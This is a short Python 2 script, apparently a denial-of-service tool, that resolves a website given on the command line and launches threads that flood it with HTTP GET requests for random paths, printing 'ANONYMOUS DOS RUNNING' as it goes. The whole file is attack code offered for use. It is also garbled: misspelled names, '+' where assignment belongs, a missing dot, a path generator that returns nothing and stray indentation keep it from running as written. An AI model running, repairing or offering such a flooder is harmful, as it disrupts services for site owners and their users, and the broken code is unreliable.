import random 
import socket
import string
import sys
import threading
import time

host = " "
ip = " "
port = 0 
num_request = 0

if len(sys.argv) == 2:
    port = 80
    num_request = 10000000000000000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_request = 10000000000000000000
elif len(sys.srgv) == 4:
    port = int(sys.argv[2])
    num_request = int(sys.argv[3])
else:
    print "ERROR\n how to use: " + sys.argv[0] + "< Hostname > < Port > < NumberATK >"
    sys.exit(1)

try:
    host = str(sys.argv[1]).replace("https://", " ")replace("http://", " ").replace("www.", " ")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print " ERROR\n make sure you enter the website correctly"
    sys.exit(2)

thread_num = 0
thread_num_mutex = threading.Lock(True)

def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] ANONYMOUS DOS RUNNING"

    thread_num_mutex.release()



def generate_url_path():
    msg = str(string.letters + string.digits + string.punctuation)
    data = " ".join(random.sample(msg, 5))

def attack():
    print_status()
    url_path = generate_url_path()

    dos + socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, port))

        dos.send("GET /%s HTTP/1.1\nHOST: %s\n\n" % (url_path, host))
    except socket.error, e:
        print "\n [No Connection or website down ]: " + str(e)
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()

print "[$] attack started on " + " (" + ip + ") || Port: " + str(port) + " || #Request: " + str(num_request)
 
 all_threads + []

 for i in xrange(num_request):
     t1 = threading.Thread(target+attack)
     t1.start()
     all_threads.append(t1)

     time.sleep(0.01)

for curent_tread in all_threads:
    curent_tread.join()


